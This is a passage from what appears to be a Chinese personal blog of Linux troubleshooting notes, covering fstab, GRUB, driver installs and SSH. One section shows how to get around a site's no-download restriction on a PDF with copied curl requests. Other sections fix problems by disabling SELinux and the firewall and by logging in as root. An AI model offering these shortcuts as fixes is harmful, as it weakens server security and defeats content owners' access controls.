class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># /dev/sda7</span><br><span class=\"line\">UUID=1faa19b8-abfb-44db-b186-5a368498d42b\t/         \text4      \trw,relatime,data=ordered\t0 1</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda1</span><br><span class=\"line\">UUID=CCCB-BF68      \t/boot/efi \tvfat      \trw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro\t0 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda4</span><br><span class=\"line\">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3\tnone      \tswap      \tdefaults  \t0 0</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda5</span><br><span class=\"line\"># UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1</span><br><span class=\"line\">UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda6</span><br><span class=\"line\"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1</span><br><span class=\"line\">UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda3</span><br><span class=\"line\"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1</span><br><span class=\"line\">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/mnt/deepin-sda3 ext4  defaults  1   2</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把<code>defaults</code>换成<code>nofail</code>还是相反，都没用</p>\n</li>\n<li><p>后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误</p>\n</li>\n</ul>\n<h4 id=\"Ubuntu\"><a href=\"#Ubuntu\" class=\"headerlink\" title=\"Ubuntu\"></a>Ubuntu</h4><ul>\n<li><p>一切正常</p>\n</li>\n<li><p>代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># /etc/fstab: static file system information.</span><br><span class=\"line\">#</span><br><span class=\"line\"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class=\"line\"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class=\"line\"># that works even if disks are added and removed. See fstab(5).</span><br><span class=\"line\">#</span><br><span class=\"line\"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class=\"line\"># / was on /dev/sda8 during installation</span><br><span class=\"line\">UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1</span><br><span class=\"line\"># /boot/efi was on /dev/sda1 during installation</span><br><span class=\"line\">UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1</span><br><span class=\"line\"># swap was on /dev/sda4 during installation</span><br><span class=\"line\">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0</span><br><span class=\"line\"># /dev/sda5</span><br><span class=\"line\"># UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1</span><br><span class=\"line\">UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2</span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda6</span><br><span class=\"line\"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1</span><br><span class=\"line\">UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda9</span><br><span class=\"line\">UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda3</span><br><span class=\"line\"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1</span><br><span class=\"line\">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"mkfs-vfat了sda2那个efi分区结果deepin启动不了\"><a href=\"#mkfs-vfat了sda2那个efi分区结果deepin启动不了\" class=\"headerlink\" title=\"mkfs.vfat了sda2那个efi分区结果deepin启动不了\"></a>mkfs.vfat了sda2那个efi分区结果deepin启动不了</h3><ul>\n<li>情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。</li>\n<li>放弃，新装一个deepin 15.6，然后就会自动安装引导。</li>\n<li>搞定后，进原来那个deepin15.5还是失败，查看<code>journalctl -xb</code>，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。</li>\n<li>原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。</li>\n<li>后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M</li>\n</ul>\n<h3 id=\"编译内核-md\"><a href=\"#编译内核-md\" class=\"headerlink\" title=\"编译内核.md\"></a>编译内核.md</h3><h4 id=\"无openssl-bio-h\"><a href=\"#无openssl-bio-h\" class=\"headerlink\" title=\"无openssl/bio.h\"></a>无openssl/bio.h</h4><blockquote>\n<p>编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”</p>\n<p> “ #include &lt;openssl/bio.h&gt;”</p>\n<p>&lt;&lt;<------------------------------------>&gt;&gt;</------------------------------------></p>\n<p>解决方法: [ubuntu 16.10,64位主机]</p>\n<p><code>sudo apt install libssl-dev</code></p>\n</blockquote>\n<h3 id=\"记一次尝试下载-不允许下载的sinacloud的pdf\"><a href=\"#记一次尝试下载-不允许下载的sinacloud的pdf\" class=\"headerlink\" title=\"记一次尝试下载 不允许下载的sinacloud的pdf\"></a>记一次尝试下载 不允许下载的sinacloud的pdf</h3><ul>\n<li><p>获得页面源代码</p>\n</li>\n<li><p>在html搜索字符串next从而定位到逻辑代码</p>\n</li>\n<li><p>然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本</p>\n</li>\n<li><p>然后去chrome控制台使用以下代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">    script.type = <span class=\"string\">'text/javascript'</span>;</span><br><span class=\"line\">    script.innerHTML = <span class=\"string\">\"console.log(closePay)\"</span><span class=\"comment\">//括号内是要获得的函数名称;</span></span><br><span class=\"line\">    <span class=\"built_in\">document</span>.head.appendChild(script);</span><br><span class=\"line\">&#125;, <span class=\"number\">1000</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败</p>\n</li>\n<li><p>直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）</p>\n</li>\n<li><p>查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice</p>\n</li>\n</ul>\n<h4 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//request head</span><br><span class=\"line\">http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span><br><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: sinacloud.net</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: en,zh;q=0.9,zh-CN;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">//从chrome复制的curl命令</span><br><span class=\"line\">curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed</span><br></pre></td></tr></table></figure>\n<h3 id=\"查找并删除特定文件-md\"><a href=\"#查找并删除特定文件-md\" class=\"headerlink\" title=\"查找并删除特定文件.md\"></a>查找并删除特定文件.md</h3><p><a href=\"https://www.cnblogs.com/langzou/p/5959940.html\" target=\"_blank\" rel=\"noopener\">来源</a><br>linux命令每日一练<br>linux中find与rm实现查找并删除目录或文件</p>\n<p>linux 下用find命令查找文件，rm命令删除文件。</p>\n<p>删除指定目录下指定文件<br>find 要查找的目录名 -name .svn |xargs rm -rf</p>\n<p>删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r</p>\n<p>分析：<br>find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录<br>| xargs rm -r 执行删除指令</p>\n<p>删除目录下所有exe文件</p>\n<p>find . -name ‘*.exe’ -type f -print -exec rm -rf {} ;</p>\n<p>(1) “.” 表示从当前目录开始递归查找</p>\n<p>(2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件</p>\n<p>(3) “ -type f “查找的类型为文件</p>\n<p>(4) “-print” 输出查找的文件目录名</p>\n<p>(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。<br>exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号</p>\n<h3 id=\"VPS上部署hexo\"><a href=\"#VPS上部署hexo\" class=\"headerlink\" title=\"VPS上部署hexo\"></a>VPS上部署hexo</h3><ul>\n<li><p><a href=\"https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n</li>\n<li><p>遇到nginx 403，然后就关闭selinux</p>\n<blockquote>\n<p>1、临时关闭<br>setenforce 0 #设置SELinux 成为permissive模式</p>\n<h1 id=\"setenforce-1-设置SELinux-成为enforcing模式\"><a href=\"#setenforce-1-设置SELinux-成为enforcing模式\" class=\"headerlink\" title=\"setenforce 1 设置SELinux 成为enforcing模式\"></a>setenforce 1 设置SELinux 成为enforcing模式</h1><p>2、修改配置文件需要重启机器：</p>\n<p>修改/etc/selinux/config 文件</p>\n<p>将SELINUX=enforcing改为SELINUX=disabled</p>\n<p>重启机器即可</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"搭建ss服务器\"><a href=\"#搭建ss服务器\" class=\"headerlink\" title=\"搭建ss服务器\"></a>搭建ss服务器</h3><ul>\n<li>vps开了进程</li>\n<li>本地主机也如此</li>\n<li>但是提示[Errno 113] No route to host</li>\n<li>实在搞不明白——22端口可以用scp发文件过去vps</li>\n<li>所以用py写了个tcpclient、tcpserver，然后一运行也如此提示</li>\n<li>所以在vps运行<code>service firewalld stop</code></li>\n<li>其他关闭服务器防火墙的方法都不起作用，不知道问什么</li>\n</ul>\n<h3 id=\"VLC字幕\"><a href=\"#VLC字幕\" class=\"headerlink\" title=\"VLC字幕\"></a>VLC字幕</h3><p><a href=\"http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h3 id=\"vbox的win7虚拟机无法使用usb\"><a href=\"#vbox的win7虚拟机无法使用usb\" class=\"headerlink\" title=\"vbox的win7虚拟机无法使用usb\"></a>vbox的win7虚拟机无法使用usb</h3><ul>\n<li><a href=\"https://blog.csdn.net/harry_helei/article/details/46972125\" target=\"_blank\" rel=\"noopener\">引用自</a></li>\n<li>安装Virtualbox Extension Pack</li>\n<li>用户权限添加<ul>\n<li>添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）<code>sudo groupadd usbfs</code>   </li>\n<li>将你的linux常用用户添加到vboxusers、usbfs这个两个组中<code>sudo adduser kuein vboxusers</code>  <code>sudo adduser kuein usbfs</code> </li>\n<li>重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Gnome-configure-md\"><a href=\"#Gnome-configure-md\" class=\"headerlink\" title=\"Gnome-configure.md\"></a>Gnome-configure.md</h3><h3 id=\"hide-title-bar\"><a href=\"#hide-title-bar\" class=\"headerlink\" title=\"hide title bar\"></a>hide title bar</h3><p><a href=\"https://extensions.gnome.org/extension/1267/no-title-bar/\" target=\"_blank\" rel=\"noopener\">no-title-bar-extention</a></p>\n<h3 id=\"SSH-md\"><a href=\"#SSH-md\" class=\"headerlink\" title=\"SSH.md\"></a>SSH.md</h3><h4 id=\"生成秘钥\"><a href=\"#生成秘钥\" class=\"headerlink\" title=\"生成秘钥\"></a>生成秘钥</h4><ul>\n<li>本地用<code>ssh-keygen</code>生成一个秘钥——可以自定义储存的文件名</li>\n<li>把<code>id_rsa.pub</code>传送到vps上，<code>cat id_rsa.pug &gt; ~/.ssh/authorized_keys</code>，注意，这个命令会覆盖原有的<code>authorized_keys</code>内容</li>\n</ul>\n<h4 id=\"本地配置VPS别名\"><a href=\"#本地配置VPS别名\" class=\"headerlink\" title=\"本地配置VPS别名\"></a>本地配置VPS别名</h4><ul>\n<li><p>代码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt;&gt; ~/.ssh/config &lt;&lt;EOF</span><br><span class=\"line\">Host VultrVPS</span><br><span class=\"line\">    User root</span><br><span class=\"line\">    Hostname 217.163.11.0</span><br><span class=\"line\">    PreferredAuthentications publickey</span><br><span class=\"line\">    IdentityFile ~/.ssh/VultrVPS_rsa</span><br><span class=\"line\">    Port 22</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>以上可实现使用秘钥 ，多个VPS可以依次增加配置</p>\n</li>\n</ul>\n<h3 id=\"Linux安装-md\"><a href=\"#Linux安装-md\" class=\"headerlink\" title=\"Linux安装.md\"></a>Linux安装.md</h3><h4 id=\"硬盘安装deepin\"><a href=\"#硬盘安装deepin\" class=\"headerlink\" title=\"硬盘安装deepin\"></a>硬盘安装deepin</h4><ul>\n<li><a href=\"http://bbs.iaixue.com/forum.php?mod=viewthread&amp;tid=1812\" target=\"_blank\" rel=\"noopener\">来源</a></li>\n</ul>\n<blockquote>\n<p>将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123;</span><br><span class=\"line\">        echo &apos;booting...&apos;</span><br><span class=\"line\">        set isofile=/deepin-15.5-amd64.iso</span><br><span class=\"line\">        search --file $isofile --set=root</span><br><span class=\"line\">        loopback loop $isofile</span><br><span class=\"line\">        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync</span><br><span class=\"line\">        initrd (loop)/live/initrd.lz</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"刻录U盘安装Fedora或Centos\"><a href=\"#刻录U盘安装Fedora或Centos\" class=\"headerlink\" title=\"刻录U盘安装Fedora或Centos\"></a>刻录U盘安装Fedora或Centos</h4><ul>\n<li>win下使用PowerISO刻录</li>\n<li>使用简单的dd命令<code>dd if=xxx of=xxx bs=xx</code>失败</li>\n<li>使用Ultraiso失败</li>\n</ul>\n<h4 id=\"U盘grub引导多个linux镜像安装\"><a href=\"#U盘grub引导多个linux镜像安装\" class=\"headerlink\" title=\"U盘grub引导多个linux镜像安装\"></a>U盘grub引导多个linux镜像安装</h4><ul>\n<li><a href=\"https://my.oschina.net/abcfy2/blog/491140\" target=\"_blank\" rel=\"noopener\">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式</a>。文中提供的deepin的那个grub配置无效</li>\n<li><a href=\"https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=150783\" target=\"_blank\" rel=\"noopener\">使用grub2制作启动U盘</a>，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败<br><img src=\"./LinuxInstall_1.jpg\" alt=\"错误信息\"></li>\n</ul>\n<h3 id=\"OSC提供的代码make不过\"><a href=\"#OSC提供的代码make不过\" class=\"headerlink\" title=\"OSC提供的代码make不过\"></a>OSC提供的代码make不过</h3><figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source code 9th/final-src-osc9e/ch2 </span><br><span class=\"line\">➜ make                                                             </span><br><span class=\"line\">make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules</span><br><span class=\"line\"><span class=\"section\">make[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class=\"line\"><span class=\"section\">arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support</span></span><br><span class=\"line\"><span class=\"section\">make[3]: *** No rule to make target 'code'.  Stop.</span></span><br><span class=\"line\"><span class=\"section\">Makefile:150: recipe for target 'sub-make' failed</span></span><br><span class=\"line\"><span class=\"section\">make[2]: *** [sub-make] Error 2</span></span><br><span class=\"line\"><span class=\"section\">Makefile:8: recipe for target 'all' failed</span></span><br><span class=\"line\"><span class=\"section\">make[1]: *** [all] Error 2</span></span><br><span class=\"line\"><span class=\"section\">make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class=\"line\"><span class=\"section\">Makefile:3: recipe for target 'all' failed</span></span><br><span class=\"line\"><span class=\"section\">make: *** [all] Error 2</span></span><br></pre></td></tr></table></figure>\n<p>解决方法，把source code 9th这个文件名的空格去掉</p>\n<h3 id=\"vim-dos-unix\"><a href=\"#vim-dos-unix\" class=\"headerlink\" title=\"vim dos unix\"></a>vim dos unix</h3><ul>\n<li>如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。</li>\n</ul>\n<h3 id=\"删除文件名以-开头的文件\"><a href=\"#删除文件名以-开头的文件\" class=\"headerlink\" title=\"删除文件名以-开头的文件\"></a>删除文件名以<code>-</code>开头的文件</h3><ul>\n<li>比如删除<code>-a</code>：<code>rm -- -a</code></li>\n</ul>\n<h3 id=\"文件的change，modification时间\"><a href=\"#文件的change，modification时间\" class=\"headerlink\" title=\"文件的change，modification时间\"></a>文件的change，modification时间</h3><ul>\n<li>以下来自于实验：change是修改属性，比如<code>touch -d 1111 filename</code>，modification是修改内容</li>\n</ul>\n<h3 id=\"ctags-注意事项\"><a href=\"#ctags-注意事项\" class=\"headerlink\" title=\"ctags 注意事项\"></a>ctags 注意事项</h3><ul>\n<li>如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效</li>\n</ul>\n<h3 id=\"watch命令\"><a href=\"#watch命令\" class=\"headerlink\" title=\"watch命令\"></a>watch命令</h3><ul>\n<li><code>watch -n 0.1 ./a.o</code> 与<code>watch ./a.o -n 0.1</code>的区别是前者<code>-n 0.1</code>是watch的参数，后者是<code>./a.o</code>的参数</li>\n</ul>\n<h3 id=\"修复light-display-manger失败\"><a href=\"#修复light-display-manger失败\" class=\"headerlink\" title=\"修复light display manger失败\"></a>修复light display manger失败</h3><ul>\n<li>通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败</li>\n<li>搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面</li>\n<li>就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的）</li>\n<li>不知道为什么中途提示proxychain 的配置文件修改了</li>\n<li>本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。</li>\n<li>后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期</li>\n</ul>\n<h3 id=\"查看glibc版本\"><a href=\"#查看glibc版本\" class=\"headerlink\" title=\"查看glibc版本\"></a>查看glibc版本</h3><ul>\n<li><code>ldd --version</code></li>\n<li><code>getconf GNU_LIBC_VERSION</code></li>\n</ul>\n<h3 id=\"shell使用-时的SIGPIPE\"><a href=\"#shell使用-时的SIGPIPE\" class=\"headerlink\" title=\"shell使用|时的SIGPIPE\"></a>shell使用<code>|</code>时的SIGPIPE</h3><ul>\n<li>比如<code>proc_1 | proc_2</code>，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die</li>\n</ul>\n<h3 id=\"安装nvidia驱动\"><a href=\"#安装nvidia驱动\" class=\"headerlink\" title=\"安装nvidia驱动\"></a>安装nvidia驱动</h3><ul>\n<li>在nvidia官网下程序</li>\n<li><code>telinit 3</code>关掉<code>X server</code>（或者是systemctl stop lightdm.service）</li>\n<li><p>安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat /proc/version</span><br><span class=\"line\">Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装时，如果有驱动占用了gpu，那么会失败，在<code>/etc/modprobe.d/</code>加一个文件（命名为<code>*.conf</code>）</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">blacklist nouveau</span><br><span class=\"line\">blacklist rivafb</span><br><span class=\"line\">blacklist rivatv</span><br><span class=\"line\">blacklist nvidiafb</span><br><span class=\"line\"></span><br><span class=\"line\"># 下面这几条应该可以不用，我不加也成功</span><br><span class=\"line\">options nouveau modeset=0 </span><br><span class=\"line\">options rivafb modeset=0</span><br><span class=\"line\">options rivatv modeset=0</span><br><span class=\"line\">options nvidiafb modeset=0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况</p>\n</li>\n<li>安装后要运行<code>nvidia-xconfig</code>配置<code>/etc/X11/xorg.conf</code>，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）</li>\n<li>然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist</li>\n<li>后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行</li>\n</ul>\n<h3 id=\"Tilix-dont-inherit-the-directory\"><a href=\"#Tilix-dont-inherit-the-directory\" class=\"headerlink\" title=\"Tilix dont inherit the directory\"></a>Tilix dont inherit the directory</h3><ul>\n<li><a href=\"https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue\" target=\"_blank\" rel=\"noopener\">The VTE matter this</a></li>\n</ul>\n<h3 id=\"sogouPinyin候选框异常解决方法\"><a href=\"#sogouPinyin候选框异常解决方法\" class=\"headerlink\" title=\"sogouPinyin候选框异常解决方法\"></a>sogouPinyin候选框异常解决方法</h3><ul>\n<li>其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了<code>~/.config</code>下面的sogou相关配置文件也没用</li>\n<li>后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）</li>\n</ul>\n<h3 id=\"cache的详细信息（包括相联度，电压等）\"><a 